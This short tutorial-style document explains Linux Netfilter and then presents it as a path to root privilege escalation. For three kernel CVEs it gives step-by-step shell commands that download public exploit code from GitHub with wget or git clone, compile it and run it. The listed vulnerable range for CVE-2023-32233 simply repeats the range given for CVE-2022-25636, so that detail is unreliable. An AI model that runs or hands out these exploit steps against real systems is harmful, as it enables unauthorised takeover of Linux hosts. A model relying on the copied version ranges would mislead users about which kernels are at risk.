## What is Netfilter?

**Netfilter** is a powerful part of the **Linux kernel** used to control network traffic. Think of it like a **traffic cop** for network data (packets). It decides what goes in, what goes out, and what should be blocked or changed.

Netfilter powers tools like:

- `iptables`
- `nftables`
- `arptables`

These tools are like rulebooks for how to handle different types of network traffic.

## What Does Netfilter Do?

Netfilter has 3 main jobs:

1. **Packet Defragmentation** – Reassembles data packets into complete messages.
2. **Connection Tracking** – Keeps track of network connections.
3. **Network Address Translation (NAT)** – Changes source or destination IP addresses (like when using internet sharing).
## Why Is Netfilter Important for Privilege Escalation?

Netfilter runs **inside the kernel**, the brain of the operating system. So, **if there’s a bug in Netfilter**, and you exploit it, you can gain **root access** — the highest privilege level in Linux.

## Real Vulnerabilities in Netfilter

### CVE-2021-22555

Vulnerable kernel versions: 2.6 - 5.11
```bash
# Download
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
# Compile
gcc -m32 -static exploit.c -o exploit
#Run
./exploit
```

### CVE-2022-25636

Vulnerable kernel 5.4 through 5.6.10

```bash

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

### CVE-2023-32233

Vulnerable kernel 5.4 through 5.6.10

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```